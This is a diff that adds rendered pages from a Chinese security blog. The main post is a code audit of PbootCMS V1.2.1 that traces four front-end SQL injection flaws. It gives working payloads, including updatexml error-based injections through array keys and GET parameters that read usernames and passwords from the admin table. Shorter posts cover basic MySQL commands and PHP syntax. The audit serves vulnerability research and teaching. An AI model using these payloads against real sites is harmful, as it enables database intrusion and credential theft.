@@ -236,6 +236,879 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/" itemprop="url">代码审计 | PbootCMS_V1.2.1详细审计SQL注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-15T08:15:41+08:00">
+                2018-10-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>之前几周复现审计文章,但是轮到自己去挖掘的时候还是两眼黑,感谢P师傅的指点,成功学习了一波,记录下来,希望自己早日进阶代码审计。</p>
+</blockquote>
+<hr>
+<blockquote>
+<p>一.前期收集审计信息</p>
+</blockquote>
+<p><strong>1.部署CMS</strong><br><code>PbootCMS</code>部署是很方便的,直接下载下来即可使用,但是系统默认使用<code>sqlite</code>的,因为笔者用<code>mysql</code>用的比较多,那这里我就以<code>mysql</code>数据库安装来跑程序。在<code>config\database.php</code></p>
+<p><img src="http://static.zybuluo.com/chhyx/tfjaax218vlz4iaj05vy8m28/image_1cpp8jqdc7mrhtd8mj1f311htf19.png" alt="image_1cpp8jqdc7mrhtd8mj1f311htf19.png-97.3kB"></p>
+<p>然后自己创建数据库<code>pbootcms</code>,导入<code>static\backup\sql\20180720164810_pbootcms.sql</code>的sql语句并执行,看到下面内容就表明数据库部署成功<br><img src="http://static.zybuluo.com/chhyx/57n9bc88jdbb3dfi5kyxslqu/image_1cpp8o9a954m1t1rnrhatv82k1m.png" alt="image_1cpp8o9a954m1t1rnrhatv82k1m.png-30.7kB"><br>然后重新打开网站 看到如下内容表明<code>PbootCMS</code>部署成功<br><img src="http://static.zybuluo.com/chhyx/wow4n0eyjmgjmkmlcel2lmvp/image_1cpp8s3l61169stgg4m1p271m5j2j.png" alt="image_1cpp8s3l61169stgg4m1p271m5j2j.png-857.4kB"></p>
+<p><strong>2.分析系统整体架构:</strong></p>
+<pre><code>PbootCMS-V1.2.1
+├─ apps         应用程序
+│  ├─ admin     后台模块
+│  ├─ api       api模块
+│  ├─ common    公共模块
+│  ├─ home      前台模块
+├─ config       配置文件
+│  ├─ config.php    配置文件
+│  ├─ database.php  数据库配置文件
+│  ├─ route.php     用户自定义路由规则
+├─ core         框架核心
+│  ├─ function  框架公共函数库
+│  │  ├─ handle.php 助手函数库1
+│  │  ├─ helper.php 助手函数库2
+├─ template     html模板
+├─ admin.php    管理端入口文件
+├─ api.php      api入口文件
+├─ index.php    前端入口文件
+</code></pre><p>这里列出一些重要的目录,可快速了解系统,有3个入口文件(<code>admin.php,api.phpi,ndex.php</code>)分别对应<code>apps</code>目录下的几个模块(<code>admin,api,home</code>)</p>
+<p><strong>3.确定路由走向</strong><br>经过初步测试,路由走向主要分为自定义路由跟普通MVC模式路由模式。<br>自定义路由:<br>查看路由文件 <code>apps\common\route.php</code><br><img src="http://static.zybuluo.com/chhyx/bk5dzuwptrot91ztl3ihidvu/image_1cpp986o17ian8je3v6hd17713d.png" alt="image_1cpp986o17ian8je3v6hd17713d.png-121kB"></p>
+<p>举个例子:</p>
+<pre><code>http://127.0.0.1/index.php/list/11
+</code></pre><p>经过上面系统自定义路由解析后访问的是</p>
+<pre><code>http://127.0.0.1/home/list/index/scode/11
+</code></pre><p>定位:<code>home</code>模块<code>list</code>控制器<code>index</code>方法<code>scode</code>参数</p>
+<p>普通MVC模式:<br>对于上面没有自定义的路由规则来说,直接按照MVC模式访问即可<br>例如:</p>
+<pre><code>http://127.0.0.1:89/index.php/Message/add
+</code></pre><p>定位:<code>apps\home\controller\MessageController.php</code>的<code>add()</code>方法</p>
+<p><strong>4.系统参数过滤情况</strong><br>a.原生态的<code>GET,POST,REQUEST</code>过滤情况<br>找一处外部可访问的地方按如下方式测试即可:<br><img src="http://static.zybuluo.com/chhyx/j2gwd0qtkf9wezdhp9q7u4wz/image_1cplpaupq1u6m1sjvtrk157tksi9.png" alt="image_1cplpaupq1u6m1sjvtrk157tksi9.png-112.5kB"></p>
+<p>根据浏览器输出我们可知原生态的获取数据方式是完全不过滤的</p>
+<p>b.系统自带函数<code>get,post,request,cookie</code>过滤情况:</p>
+<pre><code>#core\function\help.php
+function get(
+function post(
+function request(
+function cookie(
+</code></pre><p>这里前3个函数都会调用<code>filter()</code>进行过滤,<code>filter()</code>会调用<code>escape_string()</code>函数,<code>Cookie</code>是直接进行<code>escape_string()</code>过滤</p>
+<pre><code>#core\functionhandle.php
+function escape_string($string, $dropStr = true)
+{
+    if (! $string)
+        return $string;
+    if (is_array($string)) { // 数组处理
+        foreach ($string as $key =&gt; $value) {
+            $string[$key] = escape_string($value);
+        }
+    } elseif (is_object($string)) { // 对象处理
+        foreach ($string as $key =&gt; $value) {
+            $string-&gt;$key = escape_string($value);
+        }
+    } else { // 字符串处理
+        if ($dropStr) {
+            $string = preg_replace(&apos;/(0x7e)|(0x27)|(0x22)|(updatexml)|(extractvalue)|(name_const)|(concat)/i&apos;, &apos;&apos;, $string);
+        }
+        $string = htmlspecialchars(trim($string), ENT_QUOTES, &apos;UTF-8&apos;);
+        $string = addslashes($string);
+    }
+    return $string;
+}
+</code></pre><p>根据代码我们可以看到<br>0x1.首先这里经过了<code>preg_replace</code>正则匹配,对一些敏感词汇进行了过滤<br>0x2.<code>htmlspecialchars()</code>函数html实体编码(单双引号都过滤)<br>0x3.<code>addslashes()</code>函数转义</p>
+<p>注意:<br>这里的过滤只针对<code>value</code>而<code>key</code>完全无过滤<br>正则绕过很简单,只需要<code>updateupdatexmlxml</code>即可绕过</p>
+<p>因为这里绕过<code>html编码</code>与<code>addslashes()</code>函数而进行sql注入不现实<br>所以我们将重点放在key上面</p>
+<p><strong>5.了解系统DB类,数据库底层的操作方法</strong><br>这里涉及代码太多,我们只需要对一些关键的地方进行了解即可</p>
+<pre><code>#PbootCMS\core\basic\Model.php
+</code></pre><p>通过读DB底层操作代码发现这里大部分都是字符串拼接,只要可以带入’或<code>即可注入。因为在value处注入不现实,现在我们把重点放在可控的数组上--&gt;寻找参数可为数组且用</code>key`直接拼接的操作方法</p>
+<p>这里找到 <code>table()  name() field() where() order() insert() insertGetId() (调用的insert方法)  update()</code>等具有“漏洞”的操作</p>
+<blockquote>
+<p><strong>二.漏洞寻找及利用</strong></p>
+</blockquote>
+<p>这里咱们咱们重点关注前台sql注入<br>搜索方法:<br>  <strong>0x01.</strong>在<code>home\controller</code>中查找直接调用上述操作方法的函数—&gt;构建<code>sql</code><br>  <strong>0x02.</strong>在<code>home\model</code>查找调用上述操作方法的函数<code>a()</code>–&gt;返回<code>home\controller</code>中再次寻找调用<code>a()</code>函数的方法—&gt;构建<code>sql</code><br>  <strong>0x03.</strong>在公共函数库<code>apps\common</code>查找调用上述操作方法的函数<code>b()</code>–&gt;返回<code>home\controller</code>中寻找调用<code>b()</code>函数的方法—&gt;构建<code>sql</code></p>
+<p>经过上面的前期审计分析,我们心中已经有了*数,接下来就是调试构造即可,这里就以实际挖掘的过程来讲解吧。</p>
+<p>##<strong>1.Insert 注入一</strong><br><strong>代码分析:</strong><br>笔者本地测试关闭了验证码的验证,在实战中利用填写正确的验证码即可。<br>搜索<code>insert()</code>–&gt;在<code>home\model\ParserModel.php</code>找到<code>addMessage()</code>函数调用了<code>insert()</code>操作</p>
+<pre><code>public function addMessage($data)
+{
+    return parent::table(&apos;ay_message&apos;)-&gt;autoTime()-&gt;insert($data);
+}
+</code></pre><p>我们在搜索下<code>home\controller</code>哪里调用了<code>addMessage()</code>函数,在<code>MessageController.php</code>找到<code>add()</code>方法:</p>
+<pre><code>public function add()
+    {
+        if ($_POST) {
+        ...
+        // 接收数据
+        $mail_body = &apos;&apos;;
+        foreach ($form as $value) {
+            $field_data = post($value-&gt;name);
+            if (is_array($field_data)) { // 如果是多选等情况时转换
+                $field_data = implode(&apos;,&apos;, $field_data);
+            }
+            if ($value-&gt;required &amp;&amp; ! $field_data) {
+                alert_back($value-&gt;description . &apos;不能为空！&apos;);
+            } else {
+                $data[$value-&gt;name] = post($value-&gt;name);
+                $mail_body .= $value-&gt;description . &apos;：&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;;
+            }
+        }
+        ...
+
+        if ($this-&gt;model-&gt;addMessage($data)) {
+            ...
+        }
+    }
+</code></pre><p>这里的<code>$data[$value-&gt;name] = post($value-&gt;name);</code>表明将POST提交的数组直接赋值给<code>$data</code>–&gt;进入<code>addmessage()---&gt;inert()</code> 造成注入。</p>
+<p><strong>payload:</strong></p>
+<pre><code>url: http://127.0.0.1:89/index.php/Message/add
+POST: contacts[id`) values (1 and updatexml(1,concat(0x7e,user(),1),1)); -- a]=1&amp;content=1&amp;mobile=1
+</code></pre><p><strong>漏洞利用:</strong><br><img src="http://static.zybuluo.com/chhyx/ka58v3fqgjjbual6zb6mcq4c/image_1cpn0rgnj169h14k21ag1ulrksd9.png" alt="image_1cpn0rgnj169h14k21ag1ulrksd9.png-120.3kB"></p>
+<p>##<strong>2.Insert 注入二</strong><br>注意:本地测试时,需要添加一条数据才能注入,真实环境下,如果开放这个通话功能时即可直接注入<br><strong>代码分析:</strong><br>A.这里继续寻找在<code>home\Model</code>中寻找调用<code>insert</code>操作的函数,发现函数<code>addForm()</code></p>
+<pre><code>#home\Model\ParserModel.php  addForm()
+public function addForm($table, $data)
+{
+    return parent::table($table)-&gt;insert($data);
+}
+</code></pre><p>我们在搜索下<code>home\controller</code>中调用<code>addForm()</code>函数的方法,在<code>FormController.php</code>找到<code>add()</code>方法:</p>
+<pre><code>#home\controller\FormController.php add()
+public function add()
+{
+    if ($_POST) {
+        ...
+    if ($fcode == 1) {
+            alert_back(&apos;表单提交地址有误，留言提交请使用留言专用地址!&apos;);
+        }
+        ...
+    if (! $form = $this-&gt;model-&gt;getFormField($fcode)) {
+        alert_back(&apos;接收表单不存在任何字段，请核对后重试！&apos;);
+    }
+    foreach ($form as $value) {
+        $field_data = post($value-&gt;name);
+        if (is_array($field_data)) { // 如果是多选等情况时转换
+            $field_data = implode(&apos;,&apos;, $field_data);
+            }
+        if ($value-&gt;required &amp;&amp; ! $field_data) {
+            alert_back($value-&gt;description . &apos;不能为空！&apos;);
+        } else {
+            $data[$value-&gt;name] = post($value-&gt;name);
+            $mail_body .= $value-&gt;description . &apos;：&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;;
+            }
+        }
+        ...
+    if ($this-&gt;model-&gt;addForm($value-&gt;table_name, $data)) {
+</code></pre><p>跟进<code>getFormField()</code>查看:</p>
+<pre><code>    public function getFormField($fcode)
+{   ...
+    return parent::table(&apos;ay_form a&apos;)-&gt;field($field)
+        -&gt;where(&quot;a.fcode=&apos;$fcode&apos;&quot;)
+        -&gt;join($join)
+        -&gt;order(&apos;b.sorting ASC,b.id ASC&apos;)
+        -&gt;select();
+}
+</code></pre><p><code>fcode</code>为<code>ay_form</code>表的一个字段,只要<code>fcode</code>为2的字段存在即可注入<br>这里的<code>$data[$value-&gt;name] = post($value-&gt;name);</code>表明将<code>POST</code>提交的数组直接赋值给<code>$data--&gt;addForm()---&gt;inert()</code> 造成注入。</p>
+<p><strong>payload:</strong></p>
+<pre><code>url: http://127.0.0.1:89/index.php/Form/add?fcode=2
+POST: tel[id`) values (1 and updatexml(1,concat(0x7e,user()),1)); -- a]=12
+</code></pre><p><strong>漏洞利用：</strong><br>要完成漏洞利用,需要在数据库中添加一个字段使得<code>fcode</code>为2<br>我们在后台新增一个表单:<br><img src="http://static.zybuluo.com/chhyx/2wru3avgsj3u0ykcqhjknf83/image_1cpo24s2d92r1gfl11rpq1vkj9.png" alt="image_1cpo24s2d92r1gfl11rpq1vkj9.png-62.4kB"></p>
+<p>新增一个字段:<br><img src="http://static.zybuluo.com/chhyx/2dienx7ri5ej67imlqkos8s6/image_1cpo26dqd6r61d4l18vt1lj3190km.png" alt="image_1cpo26dqd6r61d4l18vt1lj3190km.png-66.3kB"><br><img src="http://static.zybuluo.com/chhyx/512i12ionncb6jg75lqax0b0/image_1cpo3bvr5f7j7cc2nd11vn1u92p.png" alt="image_1cpo3bvr5f7j7cc2nd11vn1u92p.png-226.7kB"></p>
+<p>数据库:<br><img src="http://static.zybuluo.com/chhyx/xwhvuc5mi1kmtkf75xw92quv/image_1cppm94mf134u1t061qtg1rpg9rm9.png" alt="image_1cppm94mf134u1t061qtg1rpg9rm9.png-283.3kB"></p>
+<p>注入:<br><img src="http://static.zybuluo.com/chhyx/397nmoityn6jgrqcufb2k6g2/image_1cpo3qdm010e7kr78vm1jl6e9o1j.png" alt="image_1cpo3qdm010e7kr78vm1jl6e9o1j.png-362.4kB"></p>
+<p>##<strong>3.主页处注入</strong><br><strong>代码分析:</strong><br>A.这里继续寻找在<code>home\Model</code>中寻找调用<code>where</code>操作的函数<br>找到2处<code>getList</code>与<code>getSpecifyList</code>,两处的利用点都在<code>where</code>操作里:</p>
+<pre><code>public function getList($scode, $num, $order, $filter = array(), $where = array(), $fuzzy = true)
+{
+    ...
+    return parent::table(&apos;ay_content a&apos;)-&gt;field($fields)
+        -&gt;where($where1, &apos;OR&apos;)
+        -&gt;where($where2)    //触发点
+        -&gt;where($where, &apos;AND&apos;, &apos;AND&apos;, $fuzzy)
+    ...
+}
+</code></pre><p>-</p>
+<pre><code>public function getSpecifyList($scode, $num, $order, $filter = array(), $where = array(), $fuzzy = true)
+{
+    ...
+    return parent::table(&apos;ay_content a&apos;)-&gt;field($fields)
+        -&gt;where($where1, &apos;OR&apos;)
+        -&gt;where($where2) //触发点
+        -&gt;where($where, &apos;AND&apos;, &apos;AND&apos;, $fuzzy)
+        ...
+}
+</code></pre><p>B.我们再搜索下<code>home\controller</code>中调用<code>getList()</code>或<code>getSpecifyList（）</code>函数的方法,在<code>ParserController.php</code>找到<code>parserSpecifyListLabel()</code>方法:</p>
+<pre><code>public function parserSpecifyListLabel($content)
+{
+    $pattern = &apos;/\{pboot:list(\s+[^}]+)?\}([\s\S]*?)\{\/pboot:list\}/&apos;;
+    $pattern2 = &apos;/\[list:([\w]+)(\s+[^]]+)?\]/&apos;;
+    if (preg_match_all($pattern, $content, $matches)) {
+        $count = count($matches[0]);
+        for ($i = 0; $i &lt; $count; $i ++) {
+            // 获取调节参数
+            $params = $this-&gt;parserParam($matches[1][$i]);
+            ...
+            // 数据筛选
+            $where2 = array();
+            foreach ($_GET as $key =&gt; $value) {//漏洞触发点
+                if (substr($key, 0, 4) == &apos;ext_&apos;) { // 其他字段不加入
+                    $where2[$key] = get($key); 
+                }
+            } 
+            ...
+            // 读取数据
+            //5 4   date DESC,sorting ASC,id DESC  array(0)
+            if ($page) {
+                $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2);
+            } else {
+                $data = $this-&gt;model-&gt;getSpecifyList($scode, $num, $order, $where1, $where2);
+            }
+</code></pre><p>C.阅读代码先判断GET传输过来的<code>key</code>值前4位是否为<code>ext_</code>(扩展字段),如果是的话,直接赋值给<code>$where2</code>,然后进入读取数据操作,调用<code>getList</code>或<code>getSpecifyLis</code><br>触发注入。</p>
+<p>D.我们追溯调用该<code>parserSpecifyListLabel()</code>函数的方法:<br> <code>parserSpecifyListLabel()---&gt;parserAfter()---&gt;index(IndexController.php)</code> 查看该index函数:</p>
+<pre><code>public function index()
+{
+    $content = parent::parser(&apos;index.html&apos;); // 框架标签解析
+    ...
+    $content = $this-&gt;parser-&gt;parserAfter($content); // CMS公共标签后置解析   跟进这个方法
+    $this-&gt;cache($content, true);
+}
+</code></pre><p>这里逻辑就很清楚了,利用系统解析list标签下的ext扩展字段来进行注入。<br>这里key值为任意扩展字段(<code>ext_price ext_type ext_color</code>)即可:<br><img src="http://static.zybuluo.com/chhyx/vi4grkematw263ehpl3t7cgx/image_1cpqr3p931934f811s0lfhspuk18.png" alt="image_1cpqr3p931934f811s0lfhspuk18.png-106.9kB"></p>
+<p>漏洞涉及文件:</p>
+<pre><code>IndexController.php的index()---&gt;parserAfter()---&gt;parserSpecifyListLabel()--&gt;getList()/getSpecifyList()---&gt;where() 
+</code></pre><p>直接拼接key造成注入</p>
+<p><strong>漏洞利用:</strong><br>因为系统会将空格转化为_ 我们可用/**/来绕过。</p>
+<pre><code>payload: http://127.0.0.1:89/index.php?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x23,password)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
+</code></pre><p>因为updatexml的最大长度为32位,所以在查询password时会显示不全,我们在实战过程中可以单独读取password字段或者利用其他函数注入即可。这个之后文章讨论。</p>
+<p>注入:<br><img src="http://static.zybuluo.com/chhyx/msmqe1h5bab7lemysg3zrb2l/image_1cpql0h0g1r4qia91d3l1oms6kq9.png" alt="image_1cpql0h0g1r4qia91d3l1oms6kq9.png-216.5kB"></p>
+<p>##<strong>4.搜索处注入</strong><br>代码分析:<br>A.我们继续搜索<code>home\controller</code>中调用<code>getList()</code>或<code>getSpecifyList（）</code>函数的方法,在<code>ParserController.php</code>找到<code>parserSearchLabel()</code>方法。</p>
+<pre><code>public function parserSearchLabel($content)
+{
+    $pattern = &apos;/\{pboot:search(\s+[^}]+)?\}([\s\S]*?)\{\/pboot:search\}/&apos;;
+    $pattern2 = &apos;/\[search:([\w]+)(\s+[^]]+)?\]/&apos;;
+    ...
+            // 存储搜索条件，条件为“并列”关系，由于为模糊匹配，条件为空时意味着“任意”
+            $where2 = array();
+    ...
+
+            // 数据接收
+            foreach ($_GET as $key =&gt; $value) {
+                if (! ! $value = get($key, &apos;vars&apos;)) {
+                    $where2[$key] = $value;//key 可控
+                }
+            }
+    ...
+            // 读取数据
+            if (! $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2, $fuzzy)) {
+            ...
+</code></pre><p>这里代码逻辑:将<code>GET</code>传输过来的字段直接赋值给<code>where2</code>数组 接着进入<code>getList()</code>方法 造成注入</p>
+<p>B.然后同上,搜索<code>home\controller</code>中调用<code>parserSearchLabel()</code>的方法,我们追溯调用该<code>parserSearchLabel()</code>函数的方法:<br> <code>parserSearchLabel()---&gt;index(SearchController.php)</code> 查看该index函数:</p>
+<pre><code>public function index()
+{
+    $content = parent::parser(&apos;search.html&apos;); // 框架标签解析
+    ...
+    $content = $this-&gt;parser-&gt;parserSearchLabel($content); // 搜索结果标签    跟进这个地方
+    ...
+}
+</code></pre><p>这里逻辑就很清楚了,利用系统解析<code>search</code>标签字段而对<code>get</code>传输进来的参数无有效过滤造成注入。</p>
+<p>C.涉及文件:</p>
+<pre><code>SearchController.php的index()---&gt;parserSearchLabel()--&gt;getList()/getSpecifyList()---&gt;where() 
+</code></pre><p><strong>漏洞利用:</strong></p>
+<pre><code>payload: http://127.0.0.1:89/index.php/search?updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x23,password)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
+</code></pre><p>注入:<br><img src="http://static.zybuluo.com/chhyx/lx86w77bhpkxenv0vipg9ry8/image_1cpqthi64jkb1iae1q8u1n5i1oc1l.png" alt="image_1cpqthi64jkb1iae1q8u1n5i1oc1l.png-144.6kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/mysql基础命令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/12/mysql基础命令/" itemprop="url">mysql基础命令</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T09:15:41+08:00">
+                2018-10-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>mysql基础知识,持续更新。没事儿敲一敲命令。</p>
+</blockquote>
+<hr>
+<p>mysql基础命令:</p>
+<p>连接:<code>mysql -uroot -proot</code><br>不区分大小写<br>数据库操作:</p>
+<pre><code>create DATABASE RUNOOB;//创建
+drop database runoop;//删除
+use runoob;//进入runoob库
+</code></pre><p>数据表操作:<br>进入数据库后就可对表进操作:</p>
+<pre><code>创建数据表:
+mysql&gt; create table runoob_tbl(
+    -&gt; runoob_id int not null auto_increment,
+    -&gt; runoob_title varchar(50) not null,
+    -&gt; run_auther varchar(50) not null,
+    -&gt; primary key (runoob_id)
+    -&gt; );
+
+删除数据表:
+mysql&gt;DROP TABLE runoob_tbl
+</code></pre><p>数据字段操作:</p>
+<pre><code>插入数据  //注意字段内容加引号
+mysql&gt; insert into runoob_tbl
+-&gt; (runoob_id,runoob_title,run_auther)
+-&gt; values
+-&gt; (&apos;1&apos;,&apos;test_title&apos;,&apos;P0rZ9&apos;);
+
+查询数据
+mysql-&gt;select * from runoob_tbl;
+
+删除数据
+DELETE FROM runoob_tbl WHERE runoob_id=3;
+</code></pre><hr>
+<p>union操作符可以合并两条select语句的查询结果,基本语法:</p>
+<pre><code>select * from table union select * from user;
+</code></pre><p>union使用满足条件:<br>两个查询返回的列数必须相同<br>两个查询语句返回数据类型必须相同</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/PHP基础知识/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/12/PHP基础知识/" itemprop="url">基础知识 | PHP基础知识</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T08:15:41+08:00">
+                2018-10-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>打算将PHP学习的基础知识码出来,持续更新。</p>
+</blockquote>
+<hr>
+<p>php四种标记风格：</p>
+<pre><code>&lt;?php ?&gt; //官方推荐
+&lt;? ?&gt;    //短标记风格 需要在php.ini中设置short_open_tag = on
+&lt;% %&gt;    //ASP风格    需要在php.ini中设置asp_tags = on
+&lt;script language=&quot;php&quot;&gt;代码&lt;/script&gt; //JS标记风格 任意情况都可使用
+</code></pre><p>注释:</p>
+<pre><code>// #        //单行注释
+/*   */     //多行注释
+</code></pre><p>引用赋值：<br><img src="http://static.zybuluo.com/chhyx/nvnvjmhlnfqbjyu8l5lp9pfs/image_1cpj4q7d57ph1jm11qvfeg1sqm1m.png" alt="image_1cpj4q7d57ph1jm11qvfeg1sqm1m.png-39.8kB"><br><img src="http://static.zybuluo.com/chhyx/q58f8ggkquq7i5xocprc2pg9/image_1cpj4nuff1uh41jrh14uc1i9711uop.png" alt="image_1cpj4nuff1uh41jrh14uc1i9711uop.png-47kB"></p>
+<p>字符串:<br>单引号:变量和转义的序列都不会进行转义<br>双引号:PHP会处理双引号括起来的字符串、变量以及转义序列(\n等)</p>
+<p>标识符(定界符)：<br><img src="http://static.zybuluo.com/chhyx/vkgni63ayh1e2xowi3cnum1z/image_1cpj5rk701vlv1ge1d0q106m4c023.png" alt="image_1cpj5rk701vlv1ge1d0q106m4c023.png-37.1kB"></p>
+<p>格式化字符串:<br><img src="http://static.zybuluo.com/chhyx/aourri8psost2uos8z6jqft4/image_1cpj65kpp138a1h1819jb1ufguam2g.png" alt="image_1cpj65kpp138a1h1819jb1ufguam2g.png-32.8kB"></p>
+<p>获取字串位置:</p>
+<pre><code>&lt;?php
+
+$str = &apos;Php is the best,php is my favorite&apos;;
+</code></pre><p>echo substr_count($str,’php’);//出现次数<br>    echo strpos($str,’php’);//返回php第一次出现在$str的位置<br>    echo stripos($str,’php’);//返回php第一次出现在$str的位置 不区分大小写<br>    echo strrpos($str,’php’);//返回php最后一次出现在$str的位置<br>    echo strripos($str,’php’);//返回php最后一次出现在$str的位置 不区分大小写</p>
+<pre><code>?&gt;
+</code></pre><p>字符串替换：<br><img src="http://static.zybuluo.com/chhyx/1w096o9pm7ym6uqyq7qs8yim/image_1cpj76eft8dh1ac5vd5qb12mf2t.png" alt="image_1cpj76eft8dh1ac5vd5qb12mf2t.png-34.9kB"></p>
+<p>正则:</p>
+<pre><code>a.^PHP 匹配以PHP开头的字符串
+  [^a-z] 表示匹配所有非小写字母开头的字符串
+b.PHP$ 匹配以PHP结尾的字符串
+</code></pre><p>c.^PHP$ 精确匹配PHP字符串<br>    d.PHP 匹配所有含有PHP的字符串<br>    e.com|org|net 匹配com、org、net中的任意一个<br>    f.PHP内置通用字符集</p>
+<p><img src="http://static.zybuluo.com/chhyx/gn2bptw7jyzjckdyzluyycnf/image_1cpj7d42p1hji1sahkukfrrhio3q.png" alt="image_1cpj7d42p1hji1sahkukfrrhio3q.png-34.5kB"></p>
+<pre><code>g.使用{}确定重复出现的次数
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/26tsa0smndv6beslkafazqif/image_1cpj7fkmk5fei11gvn1flv1b399.png" alt="image_1cpj7fkmk5fei11gvn1flv1b399.png-35.5kB"></p>
+<p>文件操作:<br>a.目录部分</p>
+<pre><code>$path = &quot;c:/sec/blogs/index/&quot;;
+$file = dirname($path); //返回目录 $file:c:/sec/blogs
+</code></pre><p>b.路径关联数组:</p>
+<pre><code>$pathinfo = pathinfo(&quot;www/test/index.html&quot;);
+//得到一个数组 包含4个值
+echo $pathinfo[&apos;dirname&apos;];//路径 www/test
+echo $pathinfo[&apos;basename&apos;];//基本名 index.html
+echo $pathinfo[&apos;extension&apos;];//扩展名 html
+echo $pathinfo[&apos;filename&apos;];//文件名 index
+</code></pre><p>c.文件部分<br>file<br>open<br>copy<br>file_get_contents</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/" itemprop="url">代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置</a></h1>
